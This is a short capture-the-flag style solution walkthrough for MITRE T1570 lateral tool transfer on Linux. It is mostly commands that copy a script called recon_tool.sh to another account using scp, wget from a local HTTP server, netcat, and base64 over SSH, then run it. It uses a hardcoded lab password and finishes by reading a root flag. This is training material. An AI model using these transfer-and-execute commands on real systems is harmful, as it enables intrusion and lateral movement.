# T1570 – Lateral Tool Transfer (SCP/NC/HTTP) | Solution Walkthrough
**Difficulty:** Easy | **OS:** Linux | **MITRE:** T1570

## Method 1 – SCP (Secure Copy)
```bash
scp /tmp/recon_tool.sh staging_srv@localhost:/tmp/
# password: Staging@99!
ssh staging_srv@localhost "bash /tmp/recon_tool.sh"
```

## Method 2 – Python HTTP Server (Pull)
```bash
# On "attacker" side:
cd /tmp && python3 -m http.server 8080 &
# On "target" side:
sshpass -p 'Staging@99!' ssh staging_srv@localhost \
    "wget http://localhost:8080/recon_tool.sh -O /tmp/recon_tool.sh && bash /tmp/recon_tool.sh"
```

## Method 3 – Netcat Transfer
```bash
# Receiver side first:
sshpass -p 'Staging@99!' ssh staging_srv@localhost "nc -l 4445 > /tmp/recon_tool.sh &"
# Sender:
nc localhost 4445 < /tmp/recon_tool.sh
# Execute:
sshpass -p 'Staging@99!' ssh staging_srv@localhost "bash /tmp/recon_tool.sh"
```

## Method 4 – base64 via SSH
```bash
b64=$(base64 /tmp/recon_tool.sh)
sshpass -p 'Staging@99!' ssh staging_srv@localhost "echo '$b64' | base64 -d > /tmp/t.sh && bash /tmp/t.sh"
```

## Retrieve Flag
```bash
sudo cat /root/.flags/flag.txt
# HACKTIFY{LATERAL_TOOL_TRANSFER_<hash>}
```
